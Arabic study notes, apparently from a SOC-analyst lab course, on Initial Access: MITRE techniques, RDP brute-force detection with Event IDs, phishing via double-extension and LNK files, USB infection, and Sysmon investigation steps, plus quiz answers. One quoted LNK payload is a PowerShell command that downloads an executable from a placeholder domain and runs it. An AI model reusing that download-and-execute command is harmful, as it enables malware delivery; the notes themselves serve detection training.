

---

# أولًا: ما هو Initial Access؟

في مراحل الهجوم السيبراني يوجد ما يسمى **Initial Access**  
وهو **أول لحظة يتمكن فيها المهاجم من الدخول إلى النظام أو الشبكة**.

في إطار **MITRE ATT&CK**  
يتم تصنيف Initial Access كمرحلة من مراحل الهجوم.

يمكن تخيلها مثل:

> الباب الأمامي للنظام — إذا نجح المهاجم في فتحه يبدأ الهجوم الحقيقي.

---

# ثانيًا: أنواع Initial Access

النص يقسمها إلى نوعين رئيسيين:

## 1️⃣ Exposed Services

يعني وجود خدمة على الإنترنت يمكن الوصول لها.

مثال:

- RDP
    
- Web Server
    
- Mail Server
    
- SQL Server
    

عندما تكون هذه الخدمات مكشوفة للإنترنت قد يحاول المهاجم:

- تخمين كلمة المرور
    
- استغلال ثغرة
    
- استخدام exploit
    

مثال في MITRE:

### External Remote Services

تقنيته:

```text
T1133
```

وتشمل:

- RDP
    
- SSH
    
- VPN
    
- VNC
    

---

### Exploit Public-Facing Application

تقنيته:

```text
T1190
```

وهي استغلال تطبيق أو خدمة متاحة على الإنترنت مثل:

- موقع ويب
    
- Mail server
    
- Web application
    

إذا كان هناك **ثغرة في Mail Server** فإن المهاجم يستغلها باستخدام هذه التقنية.

---

# 2️⃣ User-Driven Methods

هذا النوع يعتمد على **تفاعل المستخدم**.

أي أن المستخدم هو الذي يبدأ الهجوم بدون أن يعلم.

أمثلة:

- فتح ملف phishing
    
- الضغط على رابط خبيث
    
- استخدام USB مصاب
    
- تحميل برامج مقرصنة
    

وهذه الطرق خطيرة لأن:

> الإنسان هو أضعف حلقة في الأمن السيبراني.

---

## أشهر تقنيتين في MITRE هنا

### Phishing

تقنيته:

```text
T1566
```

يحدث عندما يرسل المهاجم:

- إيميل مزيف
    
- مرفق خبيث
    
- رابط malware
    

والمستخدم يفتحه.

---

### Removable Media

تقنيته:

```text
T1091
```

وهي إصابة الأجهزة عبر:

- USB
    
- أقراص خارجية
    

---

# ثالثًا: لماذا هذه المعرفة مهمة لمحلل SOC؟

لأن معظم الهجمات تبدأ بواحدة من هذه الطرق.

على سبيل المثال:

- Ransomware
    
- Data Breach
    
- Malware infection
    

كلها تبدأ بـ **Initial Access**.

لذلك عند تحليل حادثة يجب أن تسأل:

```
كيف دخل المهاجم أولًا؟
```

---

# حل الأسئلة

## السؤال الأول

**Which MITRE technique ID describes Initial Access via a vulnerable mail server?**

Mail server يعتبر **Public-Facing Application**.

التقنية هي:

```
T1190
```

---

## السؤال الثاني

**Which Initial Access method relies on a user opening a malicious email attachment?**

هذا يسمى:

```
Phishing
```

وهو التقنية:

```
T1566
```

---

# الإجابات النهائية

**Q1**

```
T1190
```

**Q2**

```
Phishing
```

---
---------
-----------
## Initial Access via RDP
# أولًا: ما هو RDP ولماذا هو خطير؟

## ما هو RDP؟

**Remote Desktop Protocol**

هو بروتوكول يسمح بالتحكم الكامل في جهاز Windows عن بعد.

يستخدمه:

- IT Admin
    
- دعم فني
    
- إدارة السيرفرات
    

لكن إذا تم فتحه على الإنترنت بدون حماية قوية، يصبح أخطر نقطة دخول ممكنة.

---

# لماذا يسمى RDP بـ “Ransomware Deployment Protocol”؟

لأن أغلب هجمات الفدية تبدأ هكذا:

1. المهاجم يجد RDP مفتوح على الإنترنت
    
2. يبدأ brute force
    
3. يحصل على كلمة المرور
    
4. يدخل الجهاز عبر RDP
    
5. يثبت أدوات
    
6. ينشر ransomware
    

ولهذا نعتبر RDP من أكبر مخاطر Initial Access.

1️⃣ البوتات تمسح الإنترنت بحثًا عن بورت RDP  
البورت الافتراضي هو:

3389

2️⃣ تبدأ محاولة تسجيل الدخول بآلاف كلمات المرور

يسمى هذا:

RDP Brute Force

3️⃣ إذا تم تخمين كلمة المرور → يحصل المهاجم على **Initial Access**

---

# مراحل الهجوم في السيناريو

## 1️⃣ Network Scan

المهاجم أو البوتنت يقوم بعمل **Scan للـ IP**

للعثور على:

3389 open

لا يظهر هذا عادة في **Windows logs**.

---

## 2️⃣ RDP Brute Force

هنا يبدأ المهاجم تجربة كلمات مرور كثيرة.

### كيف نكتشفه؟

في **Security Logs**

ابحث عن:

Event ID 4625

وهو يعني:

Failed Login

ثم فلتر:

Logon Type = 3 أو 10

### معنى Logon Types

|Type|المعنى|
|---|---|
|3|Network logon|
|10|Remote Interactive (RDP)|

ثم تحقق من:

Source IP

إذا كان IP خارجي ومعه مئات المحاولات → **Brute Force**

---

# 3️⃣ نجاح الاختراق

بعد حوالي 100 محاولة نجح المهاجم في تخمين:

Administrator : Summer2025

### كيف نكتشفه؟

في اللوج:

Event ID 4624

وهو:

Successful Login

ثم تحقق من:

- **Account Name**
    
- **Source IP**
    
- **Logon Type**
    

---

# 4️⃣ دخول المهاجم عبر RDP

بعد ساعتين دخل المهاجم فعليًا للجهاز.

### الفلتر

Event ID 4624  
Logon Type 10

هذا يعني:

Interactive RDP Login

---

# تتبع ما فعله المهاجم

بعد العثور على حدث تسجيل الدخول:

1️⃣ انسخ

Logon ID

2️⃣ افتح **Sysmon logs**

3️⃣ ابحث عن نفس:

Logon ID

سترى:

- البرامج التي شغلها المهاجم
    
- الأوامر التي نفذها
    
- العمليات التي بدأها
    

---

# علامات واضحة على RDP Brute Force

سترى في اللوج:

- مئات الأحداث
    

4625

خلال ثوانٍ

مثال:

Administrator  
admin  
support  
user  
test

كلها محاولات تسجيل دخول فاشلة.

---

# خلاصة مهمة لمحللي SOC

إذا رأيت:

4625 events كثيرة  
+  
External IP  
+  
Logon Type 10

فهذا غالبًا:

RDP Brute Force Attack

---

✅ **أهم Event IDs**

|Event|المعنى|
|---|---|
|4625|Failed login|
|4624|Successful login|

---

💡 نصيحة حقيقية من خبرة SOC:

غالبًا **90% من هجمات ransomware تبدأ هكذا**:

Exposed RDP  
→ Brute Force  
→ Initial Access  
→ Privilege Escalation  
→ Ransomware


---------
----------
-----
# أولًا: ما هو Phishing في الهجمات السيبرانية؟

**Phishing**

هو هجوم **هندسة اجتماعية** يحاول فيه المهاجم خداع المستخدم ليقوم هو بنفسه بتشغيل البرمجية الخبيثة.

بدل اختراق السيرفر مباشرة، المهاجم يجعل **الضحية تفتح الباب بنفسها**.

---

# لماذا Phishing خطير جدًا؟

لأن:

- الجدار الناري Firewall لا يمنعه
    
- يعتمد على **خطأ بشري**
    
- المستخدم يفتح الملف بنفسه
    
- المرفق يأتي عبر البريد الشرعي
    

التقرير المذكور في الدرس يوضح أن هجمات phishing زادت بشكل كبير بعد ظهور:

**ChatGPT**

لأن المهاجمين يستخدمون الذكاء الاصطناعي في:

- كتابة رسائل مقنعة
    
- إنشاء رسائل بدون أخطاء لغوية
    
- تقليد الشركات
    

---

# طرق Phishing التي تؤدي لاختراق Windows

الدرس يركز على طريقتين أساسيتين:

1️⃣ **Malicious Binary Attachments**  
2️⃣ **LNK Shortcut Attachments**

سنشرح الاثنين بالتفصيل.

---

# أولًا: Binary Attachments

## ما هي Binary Files؟

هي ملفات تنفيذية تحتوي برنامج يمكن تشغيله مباشرة.

في Windows أشهرها:

.exe

لكن هناك امتدادات أخرى خطيرة.

---

# امتدادات تنفيذية خطيرة في Windows

|الامتداد|الوصف|
|---|---|
|.exe|برنامج تنفيذي|
|.com|برنامج تنفيذي|
|.scr|Screen Saver لكنه executable|
|.cpl|Control Panel Applet|

كلها يمكن أن تحتوي Malware.

---

# مثال خداع المستخدم

المهاجم يرسل ملف اسمه:

tryhatme.com

المستخدم يظن أنه:

موقع ويب

لكن في الحقيقة هو:

Executable Malware

---

# الخدعة الأخطر في Windows

بشكل افتراضي Windows يخفي الامتدادات.

مثال:

الملف الحقيقي:

invoice.pdf.exe

لكن Windows يعرضه:

invoice.pdf

المستخدم يظن أنه PDF.

لكن عند فتحه يتم تشغيل:

malware.exe

---

# طريقة المهاجم لخداع المستخدم

المهاجم يقوم بثلاث أشياء:

1️⃣ تغيير اسم الملف  
2️⃣ تغيير أيقونة الملف  
3️⃣ إخفاء الامتداد الحقيقي

فيظهر الملف كأنه:

PDF  
Image  
Document

بينما هو برنامج ضار.

---

# ماذا يحدث عند تشغيل الملف؟

عند تشغيله:

1️⃣ يتم تشغيل malware  
2️⃣ يتم تنزيل payload إضافي  
3️⃣ يتم إنشاء اتصال مع C2 server  
4️⃣ يتم التحكم في الجهاز

---

# ثانيًا: هجوم LNK

الطريقة الثانية أخطر وأذكى.

---

# ما هو LNK؟

ملف:

.lnk

هو اختصار Shortcut في Windows.

مثل الاختصارات الموجودة على Desktop.

مثال:

Chrome.lnk

يشير إلى:

C:\Program Files\Google\Chrome\chrome.exe

---

# كيف يستخدمه المهاجم؟

المهاجم يصنع Shortcut يبدو طبيعيًا.

مثال:

Visit Our Website!.lnk

المستخدم يعتقد أنه:

اختصار لموقع الشركة

لكن داخله يوجد أمر خبيث.

---

# كيف يعمل الهجوم؟

الملف LNK يحتوي في خانة **Target** أمر.

عند الضغط عليه يتم تنفيذ الأمر.

مثال:

powershell.exe -c malicious command

---

# ماذا يفعل الأمر؟

يقوم بتنفيذ عدة خطوات:

1️⃣ تحميل malware  
2️⃣ حفظه داخل الجهاز  
3️⃣ تشغيله

---

# مثال Payload حقيقي

powershell.exe -c  
(New-object System.Net.WebClient).DownloadFile('https://breacheddomain.thm/FILTERED/r.exe','C:\\ProgramData\\r.exe');  
start C:\\ProgramData\\r.exe;

سنشرحه خطوة خطوة.

---

# تحليل الأمر

## تشغيل PowerShell

powershell.exe

تشغيل PowerShell في الخلفية.

---

# تحميل الملف الخبيث

DownloadFile

يعني:

Download malware from server

---

# السيرفر المستخدم

https://breacheddomain.thm

هذا يسمى:

C2 Server

أي Command & Control.

---

# مكان حفظ الملف

C:\ProgramData\r.exe

المهاجم يختار هذا المكان لأن:

- المستخدم لا يلاحظه
    
- يسمح بالتشغيل
    

---

# تشغيل الملف

start C:\ProgramData\r.exe

وهنا يبدأ malware العمل.

---

# ما هو هذا الـ malware؟

الدرس يذكر:

**RemcosRAT**

---

# ما هو RemcosRAT؟

هو RAT يعني:

Remote Access Trojan

يسمح للمهاجم:

- التحكم الكامل بالجهاز
    
- سرقة الملفات
    
- تسجيل ضغطات الكيبورد
    
- تشغيل الكاميرا
    
- نشر malware
    

---

# لماذا يستخدم المهاجم LNK؟

لعدة أسباب:

|السبب|التفسير|
|---|---|
|AV detection أقل|لأن الملف مجرد shortcut|
|بسيط التنفيذ|command فقط|
|يمكن تغيير الأيقونة|لخداع المستخدم|
|يمكن تشغيل PowerShell|لتنزيل payload|

---

# السيناريو الكامل للهجوم

الهجوم يحدث كالتالي:

1️⃣ المهاجم يرسل بريد phishing

مثال:

Discounts.zip

---

2️⃣ داخل الملف:

Discounts.zip

يوجد:

Discounts.pdf  
Visit Our Website!.lnk

---

3️⃣ المستخدم يفتح PDF

يبدو طبيعي.

---

4️⃣ المستخدم يضغط LNK

يتم تشغيل:

PowerShell

---

5️⃣ PowerShell يقوم بـ:

Download malware

---

6️⃣ يتم تشغيل:

RemcosRAT

---

7️⃣ الجهاز يصبح مخترق.


---------
-------
---------
سنحلل **Phishing Case 3** باستخدام سجلات **Sysmon** خطوة-بخطوة كما يفعل محلل SOC عند التحقيق في تنزيل ملف خبيث من بريد تصيد.

الملف الذي سنحلله:

```
C:\Users\Administrator\Desktop\Practice\Phishing Case 3\Phishing-Sysmon.evtx
```

---

# الفكرة الأساسية للتحليل

عندما يفتح المستخدم مرفق phishing، غالبًا يحدث **سلسلة أحداث (Event Chain)** داخل النظام.

السلسلة عادة تكون:

```
Browser Start
↓
File Download
↓
File Extraction
↓
Malicious Execution
```

ويمكننا تتبعها داخل Sysmon.

---

# Event IDs المهمة في Sysmon

|Event ID|ماذا يعني|
|---|---|
|1|Process Creation|
|11|File Creation|
|3|Network Connection|

---

# المرحلة 1 — تشغيل المتصفح

أول شيء يحدث:

المستخدم يفتح المتصفح لتنزيل الملف.

ستجد:

```
Event ID 1
```

داخل الحدث:

```
Image:
C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
```

و

```
ParentImage:
C:\Windows\Explorer.EXE
```

هذا يعني أن المستخدم فتح المتصفح من سطح المكتب.

---

# المرحلة 2 — تنزيل الملف

بعدها يقوم المتصفح بتنزيل الملف من البريد.

ستجد:

```
Event ID 11
```

وهو **File Created**.

داخل الحدث:

```
TargetFilename:
C:\Users\User\Downloads\invoice.zip
```

وهذا يعني:

تم تنزيل الملف في مجلد **Downloads**.

---

# المرحلة 3 — فك الضغط

عادة ملفات phishing تأتي داخل:

```
.zip
.rar
```

بعد فك الضغط سيظهر الملف الخبيث.

ستجد حدث:

```
Event ID 11
```

لكن هذه المرة:

```
Image:
C:\Windows\Explorer.exe
```

أو أحيانًا:

```
7zG.exe
```

والملف الناتج سيكون:

```
invoice.pdf.exe
```

وهذا هو **Double Extension Malware**.

---

# لماذا Double Extension خطير؟

الملف الحقيقي:

```
invoice.pdf.exe
```

لكن Windows يظهره للمستخدم:

```
invoice.pdf
```

فيعتقد أنه PDF بينما هو برنامج خبيث.

---

# المرحلة 4 — تشغيل الملف الخبيث

عندما يضغط المستخدم مرتين على الملف:

سيتم إنشاء عملية جديدة.

ستجد:

```
Event ID 1
```

داخل الحدث:

```
Image:
C:\Users\User\Downloads\invoice.pdf.exe
```

و

```
ParentImage:
C:\Windows\Explorer.EXE
```

وهذا يؤكد أن المستخدم شغّل الملف بنفسه.

---

# تحليل LNK Phishing

الـ **LNK attacks** مختلفة قليلاً.

السبب:

عند تشغيل LNK، Windows لا يسجل تشغيله مباشرة.

بل يحدث الآتي:

```
explorer.exe
↓
powershell.exe
```

لأن Explorer يقرأ **Target field** من LNK.

---

# مثال لما ستراه في Sysmon

```
Event ID 1
Image: powershell.exe
ParentImage: explorer.exe
```

لكن لا يظهر:

```
malicious.lnk
```

ولهذا يجب البحث عن **file creation event** للـ LNK.

---

# كيف نكتشف LNK attack؟

نبحث عن:

```
Event ID 11
```

حيث تم إنشاء:

```
*.lnk
```

في:

```
Downloads
```

قبل تشغيل PowerShell.

---

# خطوات التحقيق داخل اللاب

## 1️⃣ افتح Sysmon log

```
Phishing-Sysmon.evtx
```

في **Event Viewer**.

---

## 2️⃣ فلتر على Process Creation

افتح:

```
Filter Current Log
```

ثم ضع:

```
Event ID = 1
```

---

## 3️⃣ ابحث عن PowerShell

في خانة البحث:

```
powershell.exe
```

---

## 4️⃣ تحقق من Parent Process

إذا كان:

```
ParentImage = explorer.exe
```

فغالبًا تم تشغيله عبر:

```
LNK shortcut
```

---

## 5️⃣ ارجع للخلف وابحث عن LNK

فلتر:

```
Event ID = 11
```

ثم ابحث عن:

```
.lnk
```

داخل:

```
Downloads
```

---

# ما الذي سيثبته التحقيق؟

إذا رأيت التسلسل التالي:

```
1️⃣ File Creation (.lnk)
2️⃣ explorer.exe
3️⃣ powershell.exe
```

فهذا يعني:

```
Phishing via LNK
```

---

# لماذا Sysmon مهم جدًا؟

لأن Windows logs العادية لا تسجل كل هذه التفاصيل.

لكن **Sysmon** يسجل:

- العمليات
    
- إنشاء الملفات
    
- الاتصالات الشبكية
    
- تحميل DLL
    
- التلاعب بالريجستري
    

---

# خلاصة التحقيق

التسلسل المتوقع في هذا اللاب:

```
msedge.exe launched
↓
invoice.zip downloaded
↓
invoice.pdf.exe extracted
↓
invoice.pdf.exe executed
```

أو في حالة LNK:

```
malicious.lnk created
↓
explorer.exe reads LNK
↓
powershell.exe launched
↓
malware downloaded
```

---
--------
-------
-----------
----------
سنفهم أولًا **كيف يحدث الهجوم عبر USB** ثم كيف تحل اللاب باستخدام ملف Sysmon.

الملف الذي ستفحصه:

C:\Users\Administrator\Desktop\Practice\USB Case\USB-Sysmon.evtx

وسيتم التحليل باستخدام **Sysmon**.

---

# أولًا: لماذا USB خطير في الهجمات؟

الهجوم عبر USB يسمى في MITRE:

**T1091 Removable Media**

وهو يسمح للمهاجم بالاختراق حتى بدون إنترنت.

الأسباب:

- يتجاوز Firewall
    
- لا يحتاج اتصال خارجي
    
- ينتقل بسهولة بين الأجهزة
    

---

# سيناريوهات حقيقية لانتشار Malware عبر USB

## 1️⃣ USB Gift Attack

المهاجم يرسل USB يبدو كهدية.

مثال:

A gift from HR

الضحية يفتح الفلاش.

يظهر ملف:

funny.gif

لكن في الخلفية:

malware.exe runs

ويبدأ انتشار العدوى.

---

## 2️⃣ Print Shop Infection

سيناريو شائع جدًا:

1️⃣ تذهب لمحل طباعة  
2️⃣ تعطيهم USB  
3️⃣ جهازهم مصاب  
4️⃣ ينسخ malware إلى الفلاش  
5️⃣ تعود إلى جهازك  
6️⃣ تشغل الملف المصاب

فتنتقل العدوى.

---

# كيف يخفي المهاجم malware داخل USB؟

هناك عدة حيل.

---

# 1️⃣ LNK Trick

يقوم malware بـ:

- إخفاء كل الملفات الأصلية
    
- إنشاء ملف:
    

RECOVERY.lnk

يبدو كاختصار لملف.

لكن عند تشغيله:

powershell payload

---

# 2️⃣ Fake Folder Malware

ينشئ ملف مثل:

Photos.exe

لكن يغير الأيقونة لتبدو:

Folder icon

المستخدم يعتقد أنه مجلد.

لكن عند الضغط عليه:

malware runs

---

# 3️⃣ Double Extension

مثل phishing:

photo.jpg.exe

لكن يظهر للمستخدم:

photo.jpg

---

# لماذا صعب اكتشاف USB attacks؟

لأن التنفيذ يحدث عبر:

explorer.exe

مثل:

- فتح ملف
    
- الضغط مرتين
    
- تشغيل برنامج
    

وهذا نفس سلوك المستخدم الطبيعي.

---

# كيف نكتشف USB Attack في Sysmon؟

نبحث عن شيء مهم جدًا.

---

# العلامة الأساسية

البرنامج الخبيث يتم تشغيله من:

USB Drive Letter

مثال:

E:\malware.exe

بدل:

C:\Program Files

---

# هذا دليل قوي على USB Execution

لأن:

C:\ = النظام  
E:\ = USB غالبًا

---

# Event IDs المهمة في التحقيق

|Event|ماذا يعني|
|---|---|
|1|Process Creation|
|11|File Creation|
|3|Network Connection|

---

# خطوات تحليل اللاب

## 1️⃣ افتح Sysmon log

افتح:

USB-Sysmon.evtx

في Event Viewer.

---

# 2️⃣ فلتر Process Creation

افتح:

Filter Current Log

وضع:

Event ID = 1

---

# 3️⃣ ابحث عن عمليات تعمل من USB

داخل الحدث ابحث عن:

Image:  
E:\something.exe

هذا دليل أن البرنامج تم تشغيله من USB.

---

# مثال

Image: E:\Photos.exe  
ParentImage: C:\Windows\Explorer.exe

هذا يعني:

User double-clicked file on USB

---

# 4️⃣ تحقق من Parent Process

إذا كان:

ParentImage: explorer.exe

فهذا يعني:

User clicked file manually

---

# 5️⃣ تتبع نشاط malware

بعد تشغيل malware ستجد:

### Network Connection

Event ID 3

مثل:

DestinationHostname  
DestinationIp

وهذا الاتصال غالبًا يكون:

C2 server

---

# 6️⃣ تحقق من الملفات التي أنشأها malware

ابحث عن:

Event ID 11

مثل:

C:\ProgramData  
C:\Users\Public

هذه أماكن يفضلها malware.

---

# كيف يبدو التسلسل الكامل للهجوم؟

في Sysmon سترى:

USB inserted  
↓  
User opens USB in Explorer  
↓  
User double clicks file  
↓  
Process launched from E:\ drive  
↓  
Malware executed  
↓  
Network connection to C2

---

# مثال حقيقي في اللوج

Event ID 1  
Image: E:\Photos.exe  
ParentImage: explorer.exe

ثم:

Event ID 3  
Image: E:\Photos.exe  
DestinationHostname: maliciousdomain.com

---

# كيف تفرق بين USB attack و phishing؟

|Phishing|USB|
|---|---|
|C:\Users\Downloads|E:\|
|downloaded file|removable drive|
|browser involved|explorer only|

---

# خلاصة التحقيق

إذا رأيت:

Image starts with:  
E:\

فهذا يعني غالبًا:

Malware executed from USB